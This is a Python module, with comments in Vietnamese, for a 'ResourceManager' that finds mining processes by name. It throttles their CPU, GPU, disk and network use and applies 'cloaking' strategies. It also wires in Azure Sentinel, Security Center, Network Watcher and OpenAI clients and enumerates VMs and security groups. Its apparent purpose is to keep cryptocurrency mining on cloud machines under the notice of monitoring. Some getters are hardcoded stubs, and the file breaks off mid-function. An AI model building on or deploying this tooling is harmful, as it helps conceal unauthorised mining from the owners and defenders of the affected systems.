# resource_manager.py

import os
import logging
import subprocess
import psutil
import pynvml
from time import sleep, time
from pathlib import Path
from queue import PriorityQueue, Empty, Queue
from threading import Event, Thread, Lock
from typing import List, Any, Dict, Optional
from readerwriterlock import rwlock

from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .cloak_strategies import CloakStrategyFactory

from .azure_clients import (
    AzureMonitorClient,
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureSecurityCenterClient,
    AzureNetworkWatcherClient,
    AzureTrafficAnalyticsClient,
    AzureMLClient,
    AzureAnomalyDetectorClient,
    AzureOpenAIClient
)

from .auxiliary_modules import temperature_monitor

from .auxiliary_modules.power_management import (
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)


def assign_process_resources(pid: int, resources: Dict[str, Any],
                             process_name: str, logger: logging.Logger):
    """
    Thay thế cho assign_process_to_cgroups, áp dụng điều chỉnh tài nguyên 
    bằng taskset và các lệnh hệ thống khác (chưa đầy đủ do thiếu cgroup).
    """

    # Điều chỉnh CPU threads (taskset)
    if 'cpu_threads' in resources:
        try:
            cpu_count = psutil.cpu_count(logical=True)
            desired_threads = resources['cpu_threads']
            if desired_threads > cpu_count or desired_threads <= 0:
                logger.warning(
                    f"Số luồng CPU yêu cầu ({desired_threads}) không hợp lệ. Bỏ qua."
                )
            else:
                cores = ",".join(map(str, range(desired_threads)))
                subprocess.run(['taskset', '-cp', cores, str(pid)], check=True)
                logger.info(
                    f"Đã áp dụng giới hạn {desired_threads} luồng CPU cho tiến trình "
                    f"{process_name} (PID: {pid})."
                )
        except Exception as e:
            logger.error(
                f"Lỗi khi điều chỉnh luồng CPU cho {process_name} (PID: {pid}): {e}"
            )

    if 'memory' in resources:
        logger.warning(
            f"Không thể giới hạn RAM cho tiến trình {process_name} (PID: {pid}) do chưa cấu hình cgroup. Bỏ qua."
        )

    if 'cpu_freq' in resources:
        logger.warning(
            f"Không thể trực tiếp điều chỉnh tần số CPU cho tiến trình {process_name} "
            f"(PID: {pid}) do chưa cấu hình cgroup. Bỏ qua."
        )

    if 'disk_io_limit_mbps' in resources:
        logger.warning(
            f"Không thể trực tiếp điều chỉnh Disk I/O cho tiến trình {process_name} "
            f"(PID: {pid}) do chưa cấu hình cgroup. Bỏ qua."
        )


class SharedResourceManager:
    """
    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...) 
    sử dụng GPUManager và các hàm tiện ích.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.original_resource_limits = {}  # Lưu giới hạn gốc để restore
        self.gpu_manager = GPUManager()     # Quản lý GPU

    def is_gpu_initialized(self) -> bool:
        self.logger.debug(
            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
        )
        return self.gpu_manager.gpu_initialized

    def shutdown_nvml(self):
        self.gpu_manager.shutdown_nvml()

    def adjust_cpu_threads(self, pid: int, cpu_threads: int, process_name: str):
        try:
            assign_process_resources(
                pid,
                {'cpu_threads': cpu_threads},
                process_name,
                self.logger
            )
            self.logger.info(
                f"Điều chỉnh số luồng CPU xuống {cpu_threads} cho tiến trình "
                f"{process_name} (PID: {pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi điều chỉnh CPU threads cho {process_name} (PID: {pid}): {e}"
            )

    def adjust_ram_allocation(self, pid: int, ram_allocation_mb: int,
                              process_name: str):
        try:
            assign_process_resources(
                pid,
                {'memory': ram_allocation_mb},
                process_name,
                self.logger
            )
            self.logger.info(
                f"Điều chỉnh giới hạn RAM xuống {ram_allocation_mb}MB cho tiến trình "
                f"{process_name} (PID: {pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi điều chỉnh RAM cho {process_name} (PID: {pid}): {e}"
            )

    def adjust_gpu_usage(self, process: MiningProcess, gpu_usage_percent: List[float]):
        try:
            # Kiểm tra đầu vào là list
            if not isinstance(gpu_usage_percent, list):
                gpu_usage_percent = []

            step = self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10)
            new_gpu_usage = [
                min(max(gpu + step, 0), 100)
                for gpu in gpu_usage_percent
            ]
            set_gpu_usage(process.pid, new_gpu_usage)
            self.logger.info(
                f"Điều chỉnh GPU usage thành {new_gpu_usage} cho tiến trình "
                f"{process.name} (PID: {process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi điều chỉnh GPU usage cho {process.name} (PID: {process.pid}): {e}"
            )

    def adjust_disk_io_limit(self, process: MiningProcess, disk_io_limit_mbps: float):
        try:
            current_limit = temperature_monitor.get_current_disk_io_limit(process.pid)
            step = self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)

            if current_limit is not None and isinstance(disk_io_limit_mbps, (int, float)):
                new_limit = (current_limit - step
                             if current_limit > disk_io_limit_mbps
                             else current_limit + step)

                min_l = self.config["resource_allocation"]["disk_io"]["min_limit_mbps"]
                max_l = self.config["resource_allocation"]["disk_io"]["max_limit_mbps"]
                new_limit = max(min_l, min(new_limit, max_l))

                assign_process_resources(
                    process.pid,
                    {'disk_io_limit_mbps': new_limit},
                    process.name,
                    self.logger
                )
                self.logger.info(
                    f"Điều chỉnh Disk I/O xuống {new_limit} Mbps cho tiến trình "
                    f"{process.name} (PID: {process.pid})."
                )
            else:
                self.logger.warning(
                    f"Giá trị current_limit hoặc disk_io_limit_mbps không hợp lệ "
                    f"cho tiến trình {process.name} (PID: {process.pid})."
                )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi điều chỉnh Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}"
            )

    def adjust_network_bandwidth(self, process: MiningProcess, bandwidth_limit_mbps: float):
        try:
            self.apply_network_cloaking(
                process.network_interface,
                bandwidth_limit_mbps,
                process
            )
            self.logger.info(
                f"Điều chỉnh băng thông mạng xuống {bandwidth_limit_mbps} Mbps "
                f"cho tiến trình {process.name} (PID: {process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi điều chỉnh Mạng cho {process.name} (PID: {process.pid}): {e}"
            )

    def adjust_cpu_frequency(self, pid: int, frequency: int, process_name: str):
        try:
            assign_process_resources(
                pid,
                {'cpu_freq': frequency},
                process_name,
                self.logger
            )
            self.logger.info(
                f"Đặt tần số CPU = {frequency}MHz cho tiến trình {process_name} (PID: {pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi điều chỉnh tần số CPU cho {process_name} (PID: {pid}): {e}"
            )

    def adjust_gpu_power_limit(self, pid: int, power_limit: int, process_name: str):
        try:
            pynvml.nvmlInit()
            handle = pynvml.nvmlDeviceGetHandleByIndex(0)
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, power_limit * 1000)
            pynvml.nvmlShutdown()
            self.logger.info(
                f"Đặt power limit GPU = {power_limit}W cho tiến trình {process_name} (PID: {pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi điều chỉnh power GPU cho {process_name} (PID: {pid}): {e}"
            )

    def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
        try:
            subprocess.run(['ionice', '-c', str(ionice_class), '-p', str(pid)], check=True)
            self.logger.info(
                f"Đặt ionice class={ionice_class} cho tiến trình {process_name} (PID: {pid})."
            )
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi khi chạy ionice: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi adjust Disk I/O priority cho {process_name} (PID: {pid}): {e}"
            )

    def drop_caches(self):
        try:
            with open('/proc/sys/vm/drop_caches', 'w') as f:
                f.write('3\n')
            self.logger.info("Đã drop caches.")
        except Exception as e:
            self.logger.error(f"Lỗi khi drop caches: {e}")

    def apply_network_cloaking(self, interface: str, bandwidth_limit: float,
                               process: MiningProcess):
        try:
            self.configure_network_interface(interface, bandwidth_limit)
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name} (PID: {process.pid}): {e}"
            )
            raise

    def configure_network_interface(self, interface: str, bandwidth_limit: float):
        """Placeholder cho lệnh tc/iptables."""
        pass

    def throttle_cpu_based_on_load(self, process: MiningProcess, load_percent: float):
        try:
            if load_percent > 80:
                new_freq = 2000
            elif load_percent > 50:
                new_freq = 2500
            else:
                new_freq = 3000
            self.adjust_cpu_frequency(process.pid, new_freq, process.name)
            self.logger.info(
                f"Giảm tần số CPU = {new_freq}MHz dựa trên load={load_percent}% cho "
                f"{process.name} (PID: {process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi throttle CPU cho {process.name} (PID: {process.pid}): {e}"
            )

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng strategy cloaking (cpu, gpu, network, v.v.).
        """
        try:
            self.logger.debug(
                f"Tạo strategy {strategy_name} cho {process.name} (PID: {process.pid})"
            )
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.is_gpu_initialized()
            )
        except Exception as e:
            self.logger.error(f"Không thể tạo strategy {strategy_name}: {e}")
            raise

        if not strategy:
            msg = f"Strategy {strategy_name} không tạo thành công cho {process.name}."
            self.logger.warning(msg)
            raise RuntimeError(msg)

        try:
            adjustments = strategy.apply(process)
            if adjustments:
                self.logger.info(
                    f"Áp dụng strategy {strategy_name} => {adjustments} "
                    f"cho {process.name} (PID: {process.pid})."
                )

                pid = process.pid
                if pid not in self.original_resource_limits:
                    self.original_resource_limits[pid] = {}

                # Lưu giới hạn gốc
                for key, _value in adjustments.items():
                    if key == 'cpu_freq':
                        original_freq = self.get_current_cpu_frequency(pid)
                        self.original_resource_limits[pid]['cpu_freq'] = original_freq
                    elif key == 'gpu_power_limit':
                        orig_gpu_power = self.get_current_gpu_power_limit(pid)
                        self.original_resource_limits[pid]['gpu_power_limit'] = orig_gpu_power
                    elif key == 'network_bandwidth_limit_mbps':
                        orig_bw = self.get_current_network_bandwidth_limit(pid)
                        self.original_resource_limits[pid]['network_bandwidth_limit_mbps'] = orig_bw
                    elif key == 'ionice_class':
                        orig_ionice = self.get_current_ionice_class(pid)
                        self.original_resource_limits[pid]['ionice_class'] = orig_ionice
                    # ... Lưu thêm nếu cần

                self.execute_adjustments(adjustments, process)
            else:
                self.logger.warning(
                    f"Không có điều chỉnh nào cho strategy {strategy_name} "
                    f"với tiến trình {process.name} (PID: {process.pid})."
                )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking {strategy_name} cho {process.name} (PID: {process.pid}): {e}"
            )
            raise

    def restore_resources(self, process: MiningProcess):
        """Khôi phục tài nguyên cho tiến trình."""
        try:
            pid = process.pid
            process_name = process.name
            orig_limits = self.original_resource_limits.get(pid)
            if not orig_limits:
                self.logger.warning(
                    f"Không tìm thấy original limits cho {process_name} (PID: {pid})."
                )
                return

            if 'cpu_freq' in orig_limits:
                self.adjust_cpu_frequency(pid, orig_limits['cpu_freq'], process_name)
                self.logger.info(
                    f"Khôi phục CPU freq={orig_limits['cpu_freq']} cho {process_name} (PID: {pid})."
                )

            if 'cpu_threads' in orig_limits:
                self.adjust_cpu_threads(pid, orig_limits['cpu_threads'], process_name)

            if 'ram_allocation_mb' in orig_limits:
                self.adjust_ram_allocation(pid, orig_limits['ram_allocation_mb'], process_name)

            if 'gpu_power_limit' in orig_limits:
                self.adjust_gpu_power_limit(pid, orig_limits['gpu_power_limit'], process_name)

            if 'ionice_class' in orig_limits:
                self.adjust_disk_io_priority(pid, orig_limits['ionice_class'], process_name)

            if 'network_bandwidth_limit_mbps' in orig_limits:
                self.adjust_network_bandwidth(process, orig_limits['network_bandwidth_limit_mbps'])

            del self.original_resource_limits[pid]
            self.logger.info(
                f"Khôi phục xong mọi tài nguyên cho {process_name} (PID: {pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục resource cho {process.name} (PID: {process.pid}): {e}"
            )
            raise

    # Placeholder getters
    def get_current_cpu_frequency(self, pid: int) -> int:
        return 3000

    def get_current_gpu_power_limit(self, pid: int) -> int:
        return 200

    def get_current_network_bandwidth_limit(self, pid: int) -> float:
        return 1000.0

    def get_current_ionice_class(self, pid: int) -> int:
        return 2

    def execute_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        """
        Thực hiện chỉnh sửa tài nguyên cho process (CPU freq, GPU limit, network...).
        """
        pid = process.pid
        name = process.name

        for key, val in adjustments.items():
            if key == 'cpu_freq':
                self.adjust_cpu_frequency(pid, int(val), name)
            elif key == 'gpu_power_limit':
                self.adjust_gpu_power_limit(pid, int(val), name)
            elif key == 'network_bandwidth_limit_mbps':
                self.adjust_network_bandwidth(process, float(val))
            elif key == 'ionice_class':
                self.adjust_disk_io_priority(pid, int(val), name)
            elif key == 'cpu_threads':
                self.adjust_cpu_threads(pid, int(val), name)
            elif key == 'ram_allocation_mb':
                self.adjust_ram_allocation(pid, int(val), name)
            elif key == 'drop_caches':
                self.drop_caches()


class ResourceManager(BaseManager):
    """
    Lớp chính quản lý, điều phối tài nguyên.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        super().__init__(config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        self.stop_event = Event()

        self.resource_lock = rwlock.RWLockFair()
        self.resource_adjustment_queue = PriorityQueue()
        self.cloaking_request_queue = Queue()
        self.processed_tasks = set()

        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()

        # Azure clients
        self.initialize_azure_clients()
        self.discover_azure_resources()

        # Tạo threads
        self.initialize_threads()
        # SharedResourceManager cho các thao tác chung
        self.shared_resource_manager = SharedResourceManager(config, logger)

    def start(self):
        self.logger.info("Bắt đầu ResourceManager...")
        self.discover_mining_processes()
        self.start_threads()
        self.logger.info("ResourceManager đã khởi động xong.")

    def stop(self):
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        self.join_threads()
        self.shutdown_power_management()
        self.logger.info("ResourceManager đã dừng.")

    def initialize_threads(self):
        self.monitor_thread = Thread(
            target=self.monitor_and_adjust,
            name="MonitorThread",
            daemon=True
        )
        self.optimization_thread = Thread(
            target=self.optimize_resources,
            name="OptimizationThread",
            daemon=True
        )
        self.cloaking_thread = Thread(
            target=self.process_cloaking_requests,
            name="CloakingThread",
            daemon=True
        )
        self.resource_adjustment_thread = Thread(
            target=self.resource_adjustment_handler,
            name="ResourceAdjustmentThread",
            daemon=True
        )

    def start_threads(self):
        self.monitor_thread.start()
        self.optimization_thread.start()
        self.cloaking_thread.start()
        self.resource_adjustment_thread.start()

    def join_threads(self):
        self.monitor_thread.join()
        self.optimization_thread.join()
        self.cloaking_thread.join()
        self.resource_adjustment_thread.join()

    def initialize_azure_clients(self):
        self.azure_monitor_client = AzureMonitorClient(self.logger)
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_security_center_client = AzureSecurityCenterClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
        self.azure_ml_client = AzureMLClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
        self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)

    def discover_azure_resources(self):
        try:
            self.vms = self.azure_monitor_client.discover_resources(
                'Microsoft.Compute/virtualMachines'
            )
            self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")

            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

            self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
            self.logger.info(
                f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
            )

            self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
            self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}")

    def discover_mining_processes(self):
        cpu_name = self.config['processes'].get('CPU', '').lower()
        gpu_name = self.config['processes'].get('GPU', '').lower()

        with self.mining_processes_lock.gen_wlock():
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                pname = proc.info['name'].lower()
                if cpu_name in pname or gpu_name in pname:
                    prio = self.get_process_priority(proc.info['name'])
                    net_if = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(
                        proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                    )
                    self.mining_processes.append(mining_proc)
            self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.get('process_priority_map', {})
        pri_val = priority_map.get(process_name.lower(), 1)
        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
            self.logger.warning(
                f"Priority cho tiến trình '{process_name}' không phải int, gán 1."
            )
            return 1
        return pri_val

    def monitor_and_adjust(self):
        """
        Luồng theo dõi + điều chỉnh tài nguyên.
        """
        mon_params = self.config.get("monitoring_parameters", {})
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 10)
        power_intv = mon_params.get("power_monitoring_interval_seconds", 10)

        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()
                self.allocate_resources_with_priority()

                temp_lims = self.config.get("temperature_limits", {})
                cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
                gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

                for proc in self.mining_processes:
                    self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)

                power_limits = self.config.get("power_limits", {})
                per_dev_power = power_limits.get("per_device_power_watts", {})

                # Tránh so sánh dict
                cpu_max_pwr = per_dev_power.get("cpu", 150)
                if not isinstance(cpu_max_pwr, (int, float)):
                    self.logger.warning(f"cpu_max_power không hợp lệ: {cpu_max_pwr}, default=150W")
                    cpu_max_pwr = 150

                gpu_max_pwr = per_dev_power.get("gpu", 300)
                if not isinstance(gpu_max_pwr, (int, float)):
                    self.logger.warning(f"gpu_max_power không hợp lệ: {gpu_max_pwr}, default=300W")
                    gpu_max_pwr = 300

                for proc in self.mining_processes:
                    self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)

                if self.should_collect_azure_monitor_data():
                    self.collect_azure_monitor_data()

            except Exception as e:
                self.logger.error(f"Lỗi monitor_and_adjust: {e}")

            sleep(max(temp_intv, power_intv))

    def gather_metric_data_for_anomaly_detection(self) -> Dict[str, Any]:
        """
        Thu thập metric để anomaly_detector sử dụng.
        """
        data = {}
        with self.mining_processes_lock.gen_rlock():
            for proc in self.mining_processes:
                try:
                    p_obj = psutil.Process(proc.pid)
                    cpu_usage = p_obj.cpu_percent(interval=None)
                    ram_mb = p_obj.memory_info().rss / (1024 * 1024)
                    if self.shared_resource_manager.is_gpu_initialized():
                        gpu_usage_percent = temperature_monitor.get_current_gpu_usage(proc.pid)
                    else:
                        gpu_usage_percent = 0
                    disk_io_mbps = temperature_monitor.get_current_disk_io_limit(proc.pid)

                    net_bw = (self.config.get('resource_allocation', {})
                                       .get('network', {})
                                       .get('bandwidth_limit_mbps', 100))
                    cache_lim = (self.config.get('resource_allocation', {})
                                       .get('cache', {})
                                       .get('limit_percent', 50))

                    def validate(v, field):
                        if isinstance(v, dict):
                            self.logger.warning(f"PID {proc.pid}, field='{field}' là dict => bỏ qua.")
                            return None
                        return v

                    data[proc.pid] = {
                        'cpu_usage': validate(cpu_usage, 'cpu_usage'),
                        'ram_usage_mb': validate(ram_mb, 'ram_usage_mb'),
                        'gpu_usage_percent': validate(gpu_usage_percent, 'gpu_usage_percent'),
                        'disk_io_mbps': validate(disk_io_mbps, 'disk_io_mbps'),
                        'network_bandwidth_mbps': validate(net_bw, 'network_bandwidth_mbps'),
                        'cache_limit_percent': validate(cache_lim, 'cache_limit_percent'),
                    }

                    data[proc.pid] = {k: v for k, v in data[proc.pid].items() if v is not None}

                except psutil.NoSuchProcess:
                    self.logger.warning(f"Tiến trình PID {proc.pid} không còn tồn tại.")
                except Exception as e:
                    self.logger.error(f"Lỗi gather_metric_data cho PID {proc.pid}: {e}")
        return data

    def allocate_resources_with_priority(self):
        """
        Phân bổ tài nguyên (CPU threads) theo priority.
        """
        with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
            flt_procs = []
            for p in self.mining_processes:
                if not isinstance(p.priority, int):
                    self.logger.warning(f"Priority {p.priority} invalid, gán=1.")
                    p.priority = 1
                flt_procs.append(p)

            s_procs = sorted(flt_procs, key=lambda x: x.priority, reverse=True)
            
            total_cores = psutil.cpu_count(logical=True)
            allocated = 0

            for p in s_procs:
                if allocated >= total_cores:
                    self.logger.warning(
                        f"Không còn CPU core cho {p.name} (PID: {p.pid})."
                    )
                    continue

                avb = total_cores - allocated
                needed = min(p.priority, avb)
                adjustment_task = {
                    'function': 'adjust_cpu_threads',
                    'args': (p.pid, needed, p.name)
                }
                self.resource_adjustment_queue.put((3, adjustment_task))
                allocated += needed

    def check_temperature_and_enqueue(self, process: MiningProcess,
                                      cpu_max_temp: int, gpu_max_temp: int):
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = 0
            if self.shared_resource_manager.is_gpu_initialized():
                g_vals = temperature_monitor.get_gpu_temperature(process.pid)
                if isinstance(g_vals, list) and g_vals:
                    gpu_temp = max(g_vals)

            if (cpu_temp and cpu_temp > cpu_max_temp) or (gpu_temp and gpu_temp > gpu_max_temp):
                adjustments = {}
                if cpu_temp and cpu_temp > cpu_max_temp:
                    self.logger.warning(
                        f"CPU temp={cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid})."
                    )
                    adjustments['cpu_cloak'] = True
                if gpu_temp and gpu_temp > gpu_max_temp:
                    self.logger.warning(
                        f"GPU temp={gpu_temp}°C > {gpu_max_temp}°C (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True

                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                self.resource_adjustment_queue.put((2, task))
        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue error: {e}")

    def check_power_and_enqueue(self, process: MiningProcess,
                                cpu_max_power: int, gpu_max_power: int):
        try:
            c_power = get_cpu_power(process.pid)
            g_power = 0
            if self.shared_resource_manager.is_gpu_initialized():
                g_vals = get_gpu_power(process.pid)
                if isinstance(g_vals, list) and g_vals:
                    g_power = max(g_vals)

            if (c_power and c_power > cpu_max_power) or (g_power and g_power > gpu_max_power):
                adj = {}
                if c_power and c_power > cpu_max_power:
                    self.logger.warning(
                        f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid})."
                    )
                    adj['cpu_cloak'] = True
                if g_power and g_power > gpu_max_power:
                    self.logger.warning(
                        f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adj['gpu_cloak'] = True

                t = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adj
                }
                self.resource_adjustment_queue.put((2, t))
        except Exception as e:
            self.logger.error(f"check_power_and_enqueue error: {e}")

    def should_collect_azure_monitor_data(self) -> bool:
        if not hasattr(self, '_last_azure_monitor_time'):
            self._last_azure_monitor_time = 0
        now = int(time())
        interval = self.config.get("monitoring_parameters", {}).get("azure_monitor_interval_seconds", 300)
        if now - self._last_azure_monitor_time >= interval:
            self._last_azure_monitor_time = now
            return True
        return False

    def collect_azure_monitor_data(self):
        try:
            for vm in self.vms:
                rid = vm['id']
                metric_names = ['Percentage CPU', 'Available Memory Bytes']
                metrics = self.azure_monitor_client.get_metrics(rid, metric_names)
                self.logger.info(f"Thu thập chỉ số từ Azure Monitor cho VM {vm['name']}: {metrics}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_azure_monitor_data: {e}")

    def optimize_resources(self):
        opt_intv = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock.gen_rlock():
                    for proc in self.mining_processes:
                        proc.update_resource_usage()

                self.allocate_resources_with_priority()

                with self.mining_processes_lock.gen_rlock():
                    for proc in self.mining_processes:
                        current_state = self.collect_metrics(proc)
                        openai_suggestions = self.azure_openai_client.get_optimization_suggestions(current_state)
                        if not openai_suggestions:
                            self.logger.warning(
                                f"Không có gợi ý OpenAI cho {proc.name} (PID={proc.pid})."
                            )
                            continue
                        self.logger.debug(
                            f"OpenAI suggestions={openai_suggestions} cho PID={proc.pid}"
                        )
                        task = {
                            'type': 'optimization',
                            'process': proc,
                            'action': openai_suggestions
                        }
                        self.resource_adjustment_queue.put((2, task))
            except Exception as e:
                self.logger.error(f"optimize_resources error: {e}")

            sleep(opt_intv)

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập metric cho 1 process.
        """
        p_obj = psutil.Process(process.pid)
        cpu_pct = p_obj.cpu_percent(interval=1)
        mem_mb = p_obj.memory_info().rss / (1024**2)
        if self.shared_resource_manager.is_gpu_initialized():
            gpu_pct = temperature_monitor.get_current_gpu_usage(process.pid)
        else:
            gpu_pct = 0
        disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)

        net_bw = (self.config.get('resource_allocation', {})
                         .get('network', {})
                         .get('bandwidth_limit_mbps', 100))
        cache_l = (self.config.get('resource_allocation', {})
                         .get('cache', {})
                         .get('limit_percent', 50))

        return {
            'cpu_usage_percent': cpu_pct,
            'memory_usage_mb': mem_mb,
            'gpu_usage_percent': gpu_pct,
            'disk_io_mbps': disk_mbps,
            'network_bandwidth_mbps': net_bw,
            'cache_limit_percent': cache_l
        }

    def process_cloaking_requests(self):
        """
        Thread lấy item từ cloaking_request_queue và chuyển sang resource_adjustment_queue.
        """
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                adjustment_task = {
                    'type': 'cloaking',
                    'process': process,
                    'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                }
                self.resource_adjustment_queue.put((1, adjustment_task))
                self.cloaking_request_queue.task_done()
            except Empty:
                pass
            except Exception as e:
                self.logger.error(f"Lỗi process_cloaking_requests: {e}")

    def resource_adjustment_handler(self):
        """
        Thread lấy item từ resource_adjustment_queue, xử lý, gọi task_done() đúng 1 lần.
        """
        while not self.stop_event.is_set():
            try:
                priority, adjustment_task = self.resource_adjustment_queue.get(timeout=1)
                task_id = hash(str(adjustment_task))

                if task_id in self.processed_tasks:
                    self.logger.warning(f"Nhiệm vụ đã xử lý: {adjustment_task}")
                    # *KHÔNG* gọi task_done() ở đây
                    continue

                try:
                    self.execute_adjustment_task(adjustment_task)
                except Exception as task_error:
                    self.logger.error(f"Lỗi execute_adjustment_task: {task_error}")
                finally:
                    # Gọi task_done() *chính xác 1 lần*
                    # (Thêm log debug nếu cần)
                    # self.logger.debug(f"task_done() cho {adjustment_task}")
                    self.resource_adjustment_queue.task_done()

                self.processed_tasks.add(task_id)

            except Empty:
                pass
            except Exception as e:
                self.logger.error(f"Lỗi resource_adjustment_handler: {e}")

    def execute_adjustment_task(self, adjustment_task):
        """
        Thực thi nhiệm vụ điều chỉnh tài nguyên (monitoring, optimization, cloaking...).
        """
        try:
            task_type = adjustment_task.get('type')
            if task_type is None:
                # Hàm shared_resource_manager
                func_name = adjustment_task['function']
                args = adjustment_task.get('args', ())
                kwargs = adjustment_task.get('kwargs', {})
                func = getattr(self.shared_resource_manager, func_name, None)
                if func:
                    func(*args, **kwargs)
                else:
                    self.logger.error(f"Hàm {func_name} không tìm thấy.")
            else:
                process = adjustment_task['process']
                if task_type == 'cloaking':
                    # Áp dụng cloaking strategy
                    strategies = adjustment_task['strategies']
                    for st in strategies:
                        self.shared_resource_manager.apply_cloak_strategy(st, process)
                    self.logger.info(
                        f"Hoàn thành cloaking cho {process.name} (PID={process.pid})."
                    )
                elif task_type == 'optimization':
                    action = adjustment_task['action']
                    self.apply_recommended_action(action, process)
                elif task_type == 'monitoring':
                    adjustments = adjustment_task['adjustments']
                    self.apply_monitoring_adjustments(adjustments, process)
                elif task_type == 'restore':
                    self.shared_resource_manager.restore_resources(process)
                    self.logger.info(
                        f"Đã khôi phục resources cho {process.name} (PID={process.pid})."
                    )
                else:
                    self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")
        except Exception as e:
            self.logger.error(
                f"Lỗi execute_adjustment_task={adjustment_task}, chi tiết: {e}"
            )

    def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        """
        Áp dụng cloaking khi CPU/GPU temp/power quá cao, 
        hoặc throttle CPU khi có 'throttle_cpu'.
        """
        try:
            if adjustments.get('cpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cpu', process)
            if adjustments.get('gpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('gpu', process)
            if adjustments.get('throttle_cpu'):
                load_percent = psutil.cpu_percent(interval=1)
                self.shared_resource_manager.throttle_cpu_based_on_load(process, load_percent)

            self.logger.info(
                f"Áp dụng điều chỉnh monitor cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(f"apply_monitoring_adjustments error: {e}")

    def apply_recommended_action(self, action: List[Any], process: MiningProcess):
        """
        Áp dụng gợi ý từ Azure OpenAI => push tasks vào resource_adjustment_queue.
        """
        try:
            cpu_threads = int(action[0])
            ram_alloc = int(action[1])

